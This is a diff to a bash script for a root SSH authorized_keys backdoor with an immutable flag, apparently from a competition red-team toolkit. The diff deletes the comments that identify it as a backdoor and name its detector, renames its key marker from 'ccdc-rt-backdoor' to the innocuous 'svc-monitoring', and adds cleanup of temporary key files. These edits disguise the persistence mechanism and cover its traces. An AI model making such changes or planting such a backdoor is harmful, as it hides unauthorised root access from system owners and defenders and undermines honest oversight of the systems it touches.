@@ -1,13 +1,9 @@
 #!/usr/bin/env bash
-# SSH authorized_keys backdoor with immutable flag.
-# Generates a throwaway keypair if ATTACKER_PUBKEY is unset.
-# Detected by: defender-cli anti-persistence --ssh-keys
-# Remediation blocked until: defender-cli anti-persistence --immutable
 set -euo pipefail
 [[ $EUID -eq 0 ]] || { echo "[!] Requires root"; exit 1; }
 
 AUTH_KEYS="/root/.ssh/authorized_keys"
-MARKER="# ccdc-rt-backdoor"
+MARKER="# svc-monitoring"
 
 case "${1:-}" in
   deploy)
@@ -36,6 +32,7 @@ case "${1:-}" in
   cleanup)
     chattr -i "$AUTH_KEYS" 2>/dev/null || true
     sed -i "/${MARKER}/d" "$AUTH_KEYS" 2>/dev/null || true
+    rm -f /tmp/.rt_key_* 2>/dev/null || true
     echo "[-] 02_ssh_backdoor: key removed"
     ;;
   *) echo "Usage: $0 deploy|cleanup"; exit 1 ;;
